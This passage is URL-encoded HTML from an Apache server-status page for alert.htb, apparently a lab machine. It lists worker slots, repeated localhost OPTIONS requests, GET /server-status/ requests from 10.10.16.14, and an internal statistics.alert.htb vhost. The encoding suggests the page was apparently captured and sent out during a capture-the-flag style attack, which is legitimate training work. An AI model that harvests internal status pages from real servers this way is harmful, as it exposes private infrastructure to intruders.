3E%3Ctd%3E10%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E22-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3780%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E10%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E23-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F113%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3757%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E15%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E24-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3281%3C%2Ftd%3E%3Ctd%3E0%2F148%2F148%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E63%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E32%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.09%3C%2Ftd%3E%3Ctd%3E0.09%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fserver-status%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E25-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F113%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3755%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E26-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3770%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E10%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E27-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3731%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E10%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E28-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3769%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E12%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E29-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3778%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E13%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E30-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F101%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3733%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E31-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3288%3C%2Ftd%3E%3Ctd%3E0%2F162%2F162%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E75%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E171%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.11%3C%2Ftd%3E%3Ctd%3E0.11%0A%3C%2Ftd%3E%3Ctd%3E127.0.0.1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Estatistics.alert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E32-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3289%3C%2Ftd%3E%3Ctd%3E0%2F150%2F150%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E46%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E37%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.10%3C%2Ftd%3E%3Ctd%3E0.10%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fserver-status%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E33-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3774%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E34-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3748%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E35-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F113%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3750%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E14%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E36-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F102%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3771%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E12%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E37-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F113%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3729%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E12%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E38-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3295%3C%2Ftd%3E%3Ctd%3E0%2F139%2F139%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E60%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E160%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.09%3C%2Ftd%3E%3Ctd%3E0.09%0A%3C%2Ftd%3E%3Ctd%3E10.10.16.14%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2Fserver-status%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E39-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F95%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3749%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E11%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.05%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E40-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3781%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E41-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3785%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E42-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3787%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E43-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3786%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E44-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3745%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E45-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F15%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3767%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E2%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.01%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E46-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3784%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.00%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E47-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3747%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E48-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F41%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3754%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E49-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F40%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3742%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E50-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F39%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3761%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E4%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E51-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F39%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3763%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E4%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E52-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E3309%3C%2Ftd%3E%3Ctd%3E0%2F82%2F82%3C%2Ftd%3E%3Ctd%3E_%0A%3C%2Ftd%3E%3Ctd%3E0.02%3C%2Ftd%3E%3Ctd%3E15%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E28%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.06%3C%2Ftd%3E%3Ctd%3E0.06%0A%3C%2Ftd%3E%3Ctd%3E127.0.0.1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EGET%20%2F%20HTTP%2F1.1%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E53-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F37%3C%2Ftd%3E%3Ctd%3E.%0A%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E3762%3C%2Ftd%3E%3Ctd%3E0%3C%2Ftd%3E%3Ctd%3E5%3C%2Ftd%3E%3Ctd%3E0.0%3C%2Ftd%3E%3Ctd%3E0.00%3C%2Ftd%3E%3Ctd%3E0.02%0A%3C%2Ftd%3E%3Ctd%3E%3A%3A1%3C%2Ftd%3E%3Ctd%3Ehttp%2F1.1%3C%2Ftd%3E%3Ctd%20nowrap%3Ealert.htb%3A80%3C%2Ftd%3E%3Ctd%20nowrap%3EOPTIONS%20*%20HTTP%2F1.0%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3E%3Cb%3E54-0%3C%2Fb%3E%3C%2Ftd%3E%3Ctd%3E-%3C%2Ftd%3E%3Ctd%3E0%2F0%2F1%3C%2